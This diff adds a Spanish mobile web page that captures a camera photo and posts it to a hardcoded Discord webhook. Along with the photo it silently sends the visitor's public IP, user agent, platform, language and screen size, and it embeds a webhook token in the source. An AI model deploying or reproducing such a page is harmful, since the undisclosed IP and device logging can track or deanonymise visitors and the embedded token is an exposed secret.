@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Captura de rostro - Web móvil</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #111;
+            color: #fff;
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 10px;
+        }
+        video, canvas {
+            width: 100%;
+            max-width: 400px;
+            border-radius: 12px;
+            background: #000;
+            transform: scaleX(-1); /* Efecto espejo para selfie */
+        }
+        #canvas {
+            display: none;
+        }
+        .controls {
+            margin-top: 20px;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 12px;
+            justify-content: center;
+            width: 100%;
+            max-width: 400px;
+        }
+        button {
+            background: #5865F2;
+            color: #fff;
+            border: none;
+            padding: 14px 24px;
+            font-size: 18px;
+            border-radius: 50px;
+            flex: 1 1 auto;
+            min-width: 120px;
+            cursor: pointer;
+            touch-action: manipulation;
+            font-weight: bold;
+            box-shadow: 0 4px 12px rgba(88, 101, 242, 0.4);
+        }
+        button:active { transform: scale(0.95); }
+        button.secondary { background: #3b3b3b; }
+        select {
+            padding: 12px;
+            border-radius: 50px;
+            background: #222;
+            color: #fff;
+            border: 1px solid #555;
+            font-size: 16px;
+            flex: 1 1 auto;
+        }
+        .status {
+            margin-top: 16px;
+            padding: 10px 20px;
+            background: #222;
+            border-radius: 30px;
+            font-size: 14px;
+            text-align: center;
+            max-width: 400px;
+            word-break: break-all;
+        }
+        .status.success { border-left: 4px solid #2ecc71; }
+        .status.error { border-left: 4px solid #e74c3c; }
+        #preview-img {
+            display: none;
+            width: 100%;
+            max-width: 400px;
+            border-radius: 12px;
+            margin-top: 10px;
+            border: 2px solid #5865F2;
+        }
+    </style>
+</head>
+<body>
+    <h2 style="margin-bottom:12px;">📸 Captura de rostro</h2>
+    
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+    <img id="preview-img" alt="Vista previa">
+
+    <div class="controls">
+        <select id="camSelector">
+            <option value="environment">Cámara trasera</option>
+            <option value="user">Cámara frontal</option>
+        </select>
+        <button id="btnCapture">📷 Capturar</button>
+        <button id="btnSend" class="secondary" disabled>📤 Enviar a Discord</button>
+    </div>
+
+    <div id="status" class="status">Esperando cámara...</div>
+
+    <script>
+        (function() {
+            "use strict";
+
+            // --- CONFIGURACIÓN ---
+            const WEBHOOK_URL = "https://discord.com/api/webhooks/1528258625083281508/TskUp1gBftr6JJ6BbICRweaC41S4PTbRH0mYIjWCWNIl0LACwJ2zLlhZNX67NbH7mWTr";
+            const CAMERA_FACING = document.getElementById('camSelector').value; // 'user' o 'environment'
+
+            // --- ELEMENTOS DOM ---
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const ctx = canvas.getContext('2d');
+            const previewImg = document.getElementById('preview-img');
+            const statusDiv = document.getElementById('status');
+            const btnCapture = document.getElementById('btnCapture');
+            const btnSend = document.getElementById('btnSend');
+            const camSelector = document.getElementById('camSelector');
+
+            let currentStream = null;
+            let capturedBlob = null;        // Imagen capturada como Blob (JPEG)
+            let capturedDataURL = null;     // Imagen en dataURL para vista previa
+            let capturedFile = null;        // Objeto File para adjuntar
+
+            // --- FUNCIONES AUXILIARES ---
+            function setStatus(text, type = '') {
+                statusDiv.textContent = text;
+                statusDiv.className = 'status ' + type;
+            }
+
+            // Obtener IP pública usando un servicio gratuito
+            async function obtenerIP() {
+                try {
+                    const resp = await fetch('https://api.ipify.org?format=json');
+                    const data = await resp.json();
+                    return data.ip || 'desconocida';
+                } catch {
+                    return 'no disponible';
+                }
+            }
+
+            // Obtener información del dispositivo
+            function obtenerInfoDispositivo() {
+                const ua = navigator.userAgent;
+                const platform = navigator.platform || 'desconocida';
+                const language = navigator.language || 'desconocido';
+                const screen = `${window.screen.width}x${window.screen.height}`;
+                return { ua, platform, language, screen };
+            }
+
+            // --- INICIAR CÁMARA ---
+            async function iniciarCamara(facingMode = 'environment') {
+                try {
+                    if (currentStream) {
+                        currentStream.getTracks().forEach(track => track.stop());
+                    }
+                    const constraints = {
+                        video: {
+                            facingMode: facingMode,
+                            width: { ideal: 640 },
+                            height: { ideal: 480 }
+                        },
+                        audio: false
+                    };
+                    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                    currentStream = stream;
+                    video.srcObject = stream;
+                    await video.play();
+                    setStatus('✅ Cámara activa', 'success');
+                    btnCapture.disabled = false;
+                    return true;
+                } catch (err) {
+                    console.error('Error cámara:', err);
+                    setStatus('❌ Error al acceder a la cámara: ' + err.message, 'error');
+                    btnCapture.disabled = true;
+                    return false;
+                }
+            }
+
+            // --- CAPTURAR FOTO ---
+            function capturarFoto() {
+                if (!currentStream) {
+                    setStatus('❌ Cámara no disponible', 'error');
+                    return;
+                }
+                // Obtener dimensiones del video
+                const vw = video.videoWidth;
+                const vh = video.videoHeight;
+                if (vw === 0 || vh === 0) {
+                    setStatus('❌ Video sin dimensiones', 'error');
+                    return;
+                }
+                // Configurar canvas del mismo tamaño (sin espejo, la imagen se captura tal cual)
+                canvas.width = vw;
+                canvas.height = vh;
+                // Dibujar frame actual (sin invertir, ya que video tiene espejo visual pero la imagen original es correcta)
+                ctx.drawImage(video, 0, 0, vw, vh);
+                // Generar blob JPEG
+                canvas.toBlob(function(blob) {
+                    if (!blob) {
+                        setStatus('❌ Error al generar imagen', 'error');
+                        return;
+                    }
+                    capturedBlob = blob;
+                    capturedDataURL = URL.createObjectURL(blob);
+                    // Mostrar vista previa
+                    previewImg.src = capturedDataURL;
+                    previewImg.style.display = 'block';
+                    // Crear objeto File para adjuntar
+                    const fileName = `face_${Date.now()}.jpg`;
+                    capturedFile = new File([blob], fileName, { type: 'image/jpeg' });
+                    btnSend.disabled = false;
+                    setStatus(`📸 Foto capturada (${(blob.size / 1024).toFixed(1)} KB)`, 'success');
+                }, 'image/jpeg', 0.92);
+            }
+
+            // --- ENVIAR A DISCORD ---
+            async function enviarADiscord() {
+                if (!capturedFile) {
+                    setStatus('❌ No hay foto capturada', 'error');
+                    return;
+                }
+                if (!WEBHOOK_URL) {
+                    setStatus('❌ Webhook no configurado', 'error');
+                    return;
+                }
+                btnSend.disabled = true;
+                setStatus('⏳ Enviando a Discord...', '');
+
+                try {
+                    // Obtener IP pública
+                    const ip = await obtenerIP();
+                    const info = obtenerInfoDispositivo();
+                    const timestamp = new Date().toISOString();
+
+                    // Crear mensaje de texto
+                    const texto = `**📸 Captura desde web móvil**\n` +
+                        `🕒 ${timestamp}\n` +
+                        `🌐 IP pública: ${ip}\n` +
+                        `📱 Dispositivo: ${info.ua}\n` +
+                        `🖥️ Plataforma: ${info.platform}\n` +
+                        `🌍 Idioma: ${info.language}\n` +
+                        `📐 Pantalla: ${info.screen}`;
+
+                    // Preparar FormData
+                    const formData = new FormData();
+                    formData.append('file', capturedFile, capturedFile.name);
+                    formData.append('content', texto);
+
+                    // Enviar
+                    const response = await fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        body: formData
+                    });
+
+                    if (response.ok) {
+                        setStatus('✅ ¡Enviado correctamente a Discord!', 'success');
+                        // Limpiar captura para evitar reenvío
+                        // btnSend.disabled = true; // opcional
+                    } else {
+                        const errText = await response.text();
+                        setStatus(`❌ Error HTTP ${response.status}: ${errText}`, 'error');
+                        btnSend.disabled = false;
+                    }
+                } catch (err) {
+                    console.error('Error en envío:', err);
+                    setStatus(`❌ Error al enviar: ${err.message}`, 'error');
+                    btnSend.disabled = false;
+                }
+            }
+
+            // --- EVENTOS ---
+            camSelector.addEventListener('change', function() {
+                const facing = this.value;
+                iniciarCamara(facing);
+                // Resetear captura previa
+                capturedBlob = null;
+                capturedFile = null;
+                previewImg.style.display = 'none';
+                btnSend.disabled = true;
+            });
+
+            btnCapture.addEventListener('click', capturarFoto);
+
+            btnSend.addEventListener('click', enviarADiscord);
+
+            // --- INICIO ---
+            // Arrancar con cámara trasera por defecto
+            const facingDefault = 'environment';
+            camSelector.value = facingDefault;
+            iniciarCamara(facingDefault).then(ok => {
+                if (!ok) {
+                    // Si falla trasera, probar frontal
+                    camSelector.value = 'user';
+                    iniciarCamara('user');
+                }
+            });
+
+            // Manejar cierre de página para liberar recursos
+            window.addEventListener('beforeunload', function() {
+                if (currentStream) {
+                    currentStream.getTracks().forEach(t => t.stop());
+                }
+            });
+
+        })();
+    </script>
+</body>
+</html>
